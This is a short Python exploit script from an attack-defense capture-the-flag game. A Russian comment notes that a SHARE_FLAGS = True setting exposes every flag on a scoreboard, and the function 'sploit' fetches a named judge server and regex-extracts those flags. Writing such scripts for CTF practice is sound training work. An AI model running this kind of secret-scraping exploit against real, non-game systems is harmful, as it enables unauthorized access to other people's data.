# Есть конфиг с SHARE_FLAGS = True, приводящий к их выводу на борде (все флаги)
import requests
import re

URL = "http://judge.ad.kappactf.ru:8080/"

def sploit():
    r = requests.get(URL)
    print(re.findall(r"flag\s([A-Z0-9]{31}=)",r.text))

sploit()